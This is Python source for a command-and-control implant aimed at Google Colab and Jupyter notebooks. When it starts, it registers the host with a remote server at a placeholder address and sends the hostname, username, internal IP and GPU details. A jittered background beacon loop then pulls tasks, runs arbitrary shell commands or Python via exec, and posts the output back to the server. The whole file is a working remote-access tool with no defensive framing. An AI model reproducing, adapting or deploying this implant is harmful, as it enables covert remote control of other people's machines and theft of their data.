#!/usr/bin/env python3
"""C2 Agent — Google Colab / Jupyter Notebook edition.
Optimized for notebook environments with GPU/TPU detection."""

import os, sys, json, time, socket, platform, subprocess, uuid, threading
from urllib.request import Request, urlopen

C2_URL = os.environ.get("C2_URL", "http://CHANGE_ME:443")
AGENT_ID = str(uuid.uuid4())
SLEEP = 5

def get_gpu_info():
    try:
        out = subprocess.check_output("nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null", shell=True).decode().strip()
        return out or "No GPU"
    except:
        try:
            import tensorflow as tf
            tpus = tf.config.list_logical_devices('TPU')
            if tpus:
                return f"TPU x{len(tpus)}"
        except: pass
        return "No GPU"

def http_post(path, data):
    payload = json.dumps(data).encode()
    req = Request(f"{C2_URL}{path}", data=payload, headers={"Content-Type": "application/json"})
    return json.loads(urlopen(req, timeout=15).read())

def register():
    gpu = get_gpu_info()
    info = {
        "id": AGENT_ID,
        "hostname": f"colab-{socket.gethostname()}",
        "username": os.popen("whoami").read().strip(),
        "os": f"Colab {platform.system()} {platform.release()}",
        "arch": f"{platform.machine()} | GPU: {gpu}",
        "ip_internal": socket.gethostbyname(socket.gethostname()),
        "platform_type": "colab"
    }
    return http_post("/api/agent/register", info)

def execute_task(task):
    task_type = task.get("task_type", "cmd")
    payload = task.get("payload", "")

    try:
        if task_type == "cmd":
            return subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace")
        elif task_type == "python":
            old_stdout = sys.stdout
            sys.stdout = buf = __import__("io").StringIO()
            try:
                exec(payload, {"__builtins__": __builtins__})
                return buf.getvalue() or "executed"
            finally:
                sys.stdout = old_stdout
        elif task_type == "kill":
            http_post("/api/agent/result", {"task_id": task["id"], "result": "Colab agent terminated"})
            os._exit(0)
        else:
            return subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace")
    except Exception as e:
        return f"[error] {e}"

def beacon_loop():
    import random
    while True:
        try:
            resp = http_post("/api/agent/beacon", {"id": AGENT_ID})
            for task in resp.get("tasks", []):
                result = execute_task(task)
                if len(result) > 65000:
                    result = result[:65000] + "\n[...truncated]"
                http_post("/api/agent/result", {"task_id": task["id"], "result": result})
        except: pass
        time.sleep(SLEEP + random.uniform(-1, 1))

register()
threading.Thread(target=beacon_loop, daemon=True).start()
